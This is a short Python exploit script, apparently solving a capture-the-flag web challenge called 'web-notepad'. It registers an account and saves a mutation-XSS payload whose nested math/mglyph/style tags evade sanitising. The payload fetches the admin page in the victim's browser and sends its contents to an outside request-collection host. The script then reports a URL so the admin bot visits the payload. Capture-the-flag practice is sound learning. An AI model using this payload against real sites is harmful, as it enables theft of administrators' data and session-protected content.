import requests
import json

url = "https://web-notepad-f6ed1a7d.chal-2021.duc.tf/"

# Register
requests.post(url + 'register', data={"username":"pocas", "password":"pocas"})

# Login
session = requests.session()
res = session.post(url + 'login', data={"username":"pocas", "password":"pocas"})
print("[*] Successful login")

# Save XSS Poc
xss_poc = """</p><form><math><mtext></form><form><mglyph><style></math><img src=x onerror="fetch('/admin').then(function(response){return/**/response.text();}).then(function(x){fetch('https://requestbin/f='+x)})"><p>"""
headers = {'Content-Type': 'application/json;'}
data = {'note':xss_poc}
res = session.post(url + 'me', headers=headers, data=json.dumps(data))
print("[*] Successful save")

# Report a Bug
res = session.post(url + 'report', data={"url":"http://myip/poc.html"})
print("[*] Successful exploit")